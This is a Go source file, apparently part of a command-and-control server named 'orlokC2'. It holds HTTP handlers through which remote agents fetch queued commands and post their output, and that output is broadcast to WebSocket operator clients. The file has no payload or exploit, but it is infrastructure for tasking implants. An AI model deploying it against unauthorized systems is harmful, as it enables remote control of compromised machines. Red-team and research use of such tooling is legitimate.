package router

import (
	"encoding/json"
	"fmt"
	"net/http"
	"orlokC2_final/internal/middleware"
	"orlokC2_final/internal/websocket"
	"time"
)

func ResultHandler(w http.ResponseWriter, r *http.Request) {
	// Get the agent UUID from the request context
	agentUUID, _ := r.Context().Value(middleware.AgentUUIDKey).(string)

	fmt.Printf("[%s] Result endpoint hit by agent: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID)

	// Parse the incoming result - use Message type directly
	var result websocket.Message
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	fmt.Printf("[%s] Received result from agent %s:\n  Command: %s\n  Status: %s\n  Output: %s\n",
		time.Now().Format("2006-01-02 15:04:05.000"),
		agentUUID,
		result.Command,
		result.Status,
		result.Output)

	// Forward the result to the WebSocket clients
	if websocket.GlobalWSServer != nil {
		// Update the Message with required fields
		result.Type = websocket.ResponseMessage
		result.AgentUUID = agentUUID
		if result.Status == "" {
			result.Status = "completed"
		}

		// Broadcast this message directly
		websocket.GlobalWSServer.Broadcast(result)

		fmt.Printf("[%s] Broadcasting result from agent %s to all clients\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			agentUUID)
	}

	// Send acknowledgment
	w.WriteHeader(http.StatusOK)
}

func CommandHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("[%s] Command endpoint hit by agent\n",
		time.Now().Format("2006-01-02 15:04:05.000"))

	// Check if we have a command
	cmd, exists := websocket.AgentCommands.GetCommand()

	// Prepare response
	response := struct {
		Command    string `json:"command,omitempty"`
		HasCommand bool   `json:"hasCommand"`
	}{
		HasCommand: exists,
	}

	if exists {
		response.Command = cmd
		fmt.Printf("[%s] Found command: %s\n",
			time.Now().Format("2006-01-02 15:04:05.000"),
			cmd)
	} else {
		fmt.Printf("[%s] No commands available\n",
			time.Now().Format("2006-01-02 15:04:05.000"))
	}

	// Send JSON response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}
